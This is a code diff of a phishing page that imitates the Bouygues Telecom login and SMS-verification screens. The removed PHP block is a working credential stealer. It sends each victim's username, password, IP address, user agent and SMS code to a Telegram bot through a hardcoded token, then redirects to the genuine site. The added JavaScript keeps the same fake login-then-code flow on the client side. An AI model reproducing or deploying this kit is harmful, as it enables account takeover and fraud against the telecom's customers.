@@ -1,58 +1,3 @@
-<?php
-session_start();
-
-// Configuration Telegram
-$botToken = '8055587429:AAEoheYhC3Ow2MWsOVV0Bbp8ZtfTjcot_2s';
-$chatId = '7058388804';
-
-// Initialisation des variables de session
-if (!isset($_SESSION['attempt_count'])) {
-    $_SESSION['attempt_count'] = 0;
-}
-if (!isset($_SESSION['sms_attempts'])) {
-    $_SESSION['sms_attempts'] = 0;
-}
-
-// Traitement du formulaire de connexion
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
-    $_SESSION['attempt_count']++;
-    $_SESSION['last_username'] = $_POST['username'];
-    $_SESSION['show_sms_form'] = true;
-    $_SESSION['sms_error'] = false;
-    
-    // Envoyer les identifiants à Telegram
-    $message = "🔐 Nouvelle tentative de connexion:\n";
-    $message .= "👤 Identifiant: " . $_POST['username'] . "\n";
-    $message .= "🔑 Mot de passe: " . $_POST['password'] . "\n";
-    $message .= "📡 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
-    $message .= "🌐 User Agent: " . $_SERVER['HTTP_USER_AGENT'];
-    
-    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
-    @file_get_contents($url);
-}
-
-// Traitement du formulaire SMS
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
-    $_SESSION['sms_attempts']++;
-    
-    // Envoyer le code SMS à Telegram
-    $message = "📱 Code SMS soumis:\n";
-    $message .= "🔢 Code: " . $_POST['sms_code'] . "\n";
-    $message .= "🔁 Tentative: " . $_SESSION['sms_attempts'] . "\n";
-    $message .= "📡 IP: " . $_SERVER['REMOTE_ADDR'];
-    
-    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
-    @file_get_contents($url);
-    
-    // Rediriger après la deuxième tentative
-    if ($_SESSION['sms_attempts'] >= 2) {
-        header('Location: https://www.bouyguestelecom.fr');
-        exit;
-    } else {
-        $_SESSION['sms_error'] = true;
-    }
-}
-?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -93,6 +38,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
     .fade-in {
       animation: fadeIn 0.5s;
     }
+    #smsTitle, #smsFormContainer {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -107,7 +55,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
   
   <section>
     <div class="box">
-      <?php if (!isset($_SESSION['show_sms_form'])): ?>
       <!-- FORMULAIRE DE CONNEXION -->
       <div class="tit text-center" id="loginTitle">
         <div class="fi">👋</div>
@@ -117,21 +64,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
       <div class="form frm" id="loginFormContainer">
         <div class="champ mt-2 mb-3">* champs obligatoires</div>
         
-        <?php if(isset($_SESSION['show_error']) && $_SESSION['show_error']): ?>
-        <div class="alert alert-danger text-center" role="alert">
-          <i class="fas fa-exclamation-triangle"></i> Identifiant ou mot de passe incorrect. Veuillez réessayer.
-        </div>
-        <?php $_SESSION['show_error'] = false; ?>
-        <?php endif; ?>
-        
         <form action="" method="post" id="loginForm">
           <input type="hidden" id="cap" name="cap">
           <input type="hidden" name="steeep" id="steeep" value="login">
           
           <div class="form-group">
             <label for="username">Identifiant (n°mobile, e-mail ...) <span>*</span></label>
-            <input type="text" class="form-control" id="username" name="username" 
-                   value="<?php echo isset($_SESSION['last_username']) ? htmlspecialchars($_SESSION['last_username']) : ''; ?>" required>
+            <input type="text" class="form-control" id="username" name="username" required>
             <div class="a"><a href="#">Comment retrouver mon identifiant ?</a></div>
           </div>
           
@@ -149,7 +88,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
           </div>
           
           <div class="bttn text-center mt-4">
-            <button type="submit">Me connecter</button>
+            <button type="button" id="loginButton">Me connecter</button>
           </div>
           
           <div class="a text-center mt-5">
@@ -158,23 +97,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
         </form>
       </div>
 
-      <?php else: ?>
       <!-- FORMULAIRE DE VERIFICATION SMS -->
       <div class="tit text-center" id="smsTitle">
         <div class="fi">🔒</div>
         <h2>Vérification de sécurité</h2>
-        <p class="mt-3">Nous avons envoyé un code à 6 chiffres par SMS au numéro *******<?php echo isset($_SESSION['last_username']) ? substr($_SESSION['last_username'], -2) : '**'; ?></p>
+        <p class="mt-3" id="smsPhoneText">Nous avons envoyé un code à 6 chiffres par SMS au numéro *******<span id="lastDigits"></span></p>
       </div>
       
       <div class="form frm" id="smsFormContainer">
-        <?php if(isset($_SESSION['sms_error']) && $_SESSION['sms_error']): ?>
-        <div class="alert alert-danger text-center" role="alert">
+        <div class="alert alert-danger text-center" role="alert" id="smsError" style="display: none;">
           <i class="fas fa-exclamation-triangle"></i> Code incorrect. Veuillez réessayer.
         </div>
-        <?php $_SESSION['sms_error'] = false; ?>
-        <?php endif; ?>
         
-        <form action="" method="post">
+        <form action="" method="post" id="smsForm">
           <div class="form-group">
             <label for="sms_code">Code de vérification <span>*</span></label>
             <input type="text" class="form-control" id="sms_code" name="sms_code" maxlength="6" required>
@@ -182,11 +117,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
           </div>
           
           <div class="bttn text-center mt-4">
-            <button type="submit">Vérifier</button>
+            <button type="button" id="verifyButton">Vérifier</button>
           </div>
         </form>
       </div>
-      <?php endif; ?>
     </div>
   </section>
 
@@ -196,6 +130,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
   <script src="/Sm1/DUVzTTavlOw//media/js/js.js"></script>
   
   <script>
+    // Variables pour simuler le comportement
+    let showSmsForm = false;
+    let smsAttempts = 0;
+    let lastUsername = '';
+    
     $('.eye').click(function(){
       $(this).hide();
       $('.eye-sl').show();
@@ -210,20 +149,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
 
     $('#sms_code').mask('000000');
     
-    <?php if (isset($_SESSION['show_sms_form'])): ?>
-    $(document).ready(function() {
+    $('#loginButton').click(function() {
+      // Simuler la soumission du formulaire de connexion
+      lastUsername = $('#username').val();
+      showSmsForm = true;
+      
+      // Afficher le formulaire SMS
       $('#loginTitle').addClass('fade-out');
       $('#loginFormContainer').addClass('fade-out');
       
       setTimeout(function() {
-        $('#loginTitle').remove();
-        $('#loginFormContainer').remove();
-        $('#smsTitle').addClass('fade-in');
-        $('#smsFormContainer').addClass('fade-in');
+        $('#loginTitle').hide();
+        $('#loginFormContainer').hide();
+        $('#lastDigits').text(lastUsername.slice(-2));
+        $('#smsTitle').show().addClass('fade-in');
+        $('#smsFormContainer').show().addClass('fade-in');
       }, 500);
     });
-    <?php endif; ?>
+    
+    $('#verifyButton').click(function() {
+      // Simuler la vérification du code SMS
+      smsAttempts++;
+      
+      if (smsAttempts >= 2) {
+        // Redirection après 2 tentatives
+        window.location.href = 'https://www.bouyguestelecom.fr';
+      } else {
+        // Afficher l'erreur
+        $('#smsError').show();
+      }
+    });
   </script>
 </body>
-
 </html>
